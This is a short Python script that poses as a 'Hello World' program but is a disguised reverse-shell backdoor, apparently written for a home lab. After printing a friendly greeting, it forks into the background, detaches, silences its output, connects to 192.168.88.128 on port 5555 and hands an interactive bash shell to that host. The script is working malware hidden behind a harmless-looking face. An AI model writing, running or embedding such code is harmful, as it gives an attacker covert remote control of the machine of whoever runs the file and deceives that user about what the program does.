#!/usr/bin/python3

import os
import socket
import subprocess
import sys

IP = "192.168.88.128"
PORT = 5555

print("Hello World! This is a simple Hello World Program :)")

try:
	pid = os.fork()

	if pid == 0:
		os.chdir(os.getcwd())
		os.setsid()
		os.umask(0)

		try:
			child_id = os.fork()

			if child_id == 0:
				ps = f"[*] PID running in ubuntu: {os.getpid()}\n"
				sys.stdout.flush()
				sys.stderr.flush()

				redirect = open("/dev/null", "w")
				sys.stdout = redirect
				sys.stderr = redirect

				kali=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
				kali.connect((IP, PORT))
				kali.send(ps.encode())
				subprocess.call(["/bin/bash","-i"],stdin=kali.fileno(),stdout=kali.fileno(),stderr=kali.fileno())					
			else:
				sys.exit(0)
		except OSError:
			print(OSError)
			sys.exit(0)
	else:
		sys.exit(0)
except OSError:
	sys.exit(0)
